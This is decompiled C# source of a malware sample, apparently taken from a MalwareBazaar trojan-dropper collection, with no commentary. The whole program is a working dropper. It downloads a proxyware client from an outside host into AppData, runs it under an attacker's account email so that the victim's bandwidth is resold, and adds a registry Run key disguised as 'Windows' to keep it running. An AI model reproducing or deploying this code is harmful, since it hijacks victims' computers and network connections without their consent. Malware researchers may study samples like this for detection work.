// Decompiled with JetBrains decompiler
// Type: App.Program
// Assembly: App, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CE4A763E-C994-45A8-9343-D3B466FCE7D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Dropper.MSIL.Sysn.gen-f6d641ecd428b812b165c68bfdf7ed3690ff27a67073472195b5df319fc45cd3.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO.Compression;
using System.Net;

namespace App
{
  internal class Program
  {
    private static void Main(string[] args)
    {
      WebClient webClient = new WebClient();
      if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/p2pclient.zip"))
      {
        webClient.DownloadFile("https://updates.peer2profit.com/p2pclient_v0.55_signed.zip", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/p2pclient.zip");
        ZipFile.ExtractToDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/p2pclient.zip", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
      }
      Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\p2pclient.exe");
      Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\p2pclient.exe", "-l niveacremeproxy@gmail.com");
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows", (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\p2pclient.exe -l niveacremeproxy@gmail.com"));
    }
  }
}
